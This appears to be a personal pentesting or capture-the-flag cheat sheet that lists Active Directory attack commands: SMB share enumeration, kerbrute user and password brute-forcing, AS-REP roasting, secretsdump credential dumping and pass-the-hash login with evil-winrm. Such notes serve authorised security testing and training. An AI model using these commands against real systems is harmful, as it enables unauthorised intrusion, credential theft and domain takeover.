# Active Directory? What to do?

**Adjust each command with the correct condition**

## list shares
`smbclient -L //[IP]`

## try anonymous login
`smbclient -N //[IP]/[sharename]`

## enum more with enum4linux
`enum4linux -a [IP]`

## spray username or password with kerbrute
`~/scripts/kerbrute userenum --dc [IP] -d [domain-name] [user_list]`
`~/scripts/kerbrute bruteuser --dc [IP] -d [domain-name] [password_list] [username]`

## ASREPRoasting with GetNPUsers.py
`python3 ~/scripts/impacket/examples/GetNPUsers.py -dc-ip [IP] [domain-name]/[user] -no-pass`
and crack it

## login to smbclient if you have creds
`smbclient -L //[IP] --user=[user]`

## access shares if you have creds
`smbclient //[IP]/[sharename] --user=[user]`

## try to dump secrets of you have creds
`python3 ~/scripts/impacket/examples/secretsdump.py -target-ip [IP] [domain-name]/[full-username] -outputfile secretsdump.log`
or
`python3 ~/scripts/impacket/examples/secretsdump.py [options you want] [user]:[password]@[IP]`

## got NTLM hash? got password? got user? evil-winrm time
`evil-winrm -i [IP] -u [user] -H [NTLM hash]`
or just use the password if you got one



